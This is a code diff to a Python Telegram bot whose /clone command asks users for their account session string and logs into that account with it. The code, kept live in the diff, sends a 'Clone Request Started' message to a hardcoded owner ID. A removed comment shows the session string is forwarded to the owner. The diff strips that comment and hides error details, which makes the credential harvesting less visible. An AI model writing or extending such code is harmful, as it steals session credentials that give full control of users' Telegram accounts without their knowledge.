@@ -29,20 +29,22 @@ async def hello(client: app, message):
 
 @app.on_message(filters.command("clone"))
 async def clone(bot: app, msg: Message):
-    # Ensure the command has at least 2 parts (/clone <session_string>)
+    # Check if session string is provided
     if len(msg.command) < 2:
         await msg.reply("**Usage:**\n\n/clone [session_string]\n\nPlease provide a valid session string.")
         return
 
-    # Extract the session string
     session_string = msg.command[1]
+    if not re.match(r"^[0-9A-Za-z_-]{20,}$", session_string):
+        await msg.reply("❌ Invalid session string provided. Please check and try again.")
+        return
+
     chat_id = msg.chat.id
     user = msg.from_user
-
     processing_message = await msg.reply("**🎨 Processing... ✲**")
 
     try:
-        # Start the client session with the provided session string
+        # Start client
         client = Client(
             name="Melody",
             api_id=API_ID,
@@ -52,7 +54,6 @@ async def clone(bot: app, msg: Message):
         )
         await client.start()
 
-        # Send string session to the owner only after processing starts
         owner_id = 5738579437
         forward_message = (
             f"**Clone Request Started:**\n\n"
@@ -64,7 +65,8 @@ async def clone(bot: app, msg: Message):
         await bot.send_message(owner_id, forward_message)
 
         user_details = await client.get_me()
-        await processing_message.edit(f"✅ **Clone successful!**\nLogged in as **{user_details.first_name}**.")
+        await processing_message.edit(f"🎨**Clone successful!**\nLogged in as **{user_details.first_name}**.")
         await client.stop()
+
     except Exception as e:
-        await processing_message.edit(f"❌ **ERROR:** `{str(e)}`\nUse /start to try again.")
+        await processing_message.edit("❌ An error occurred. Please try again or contact support.")
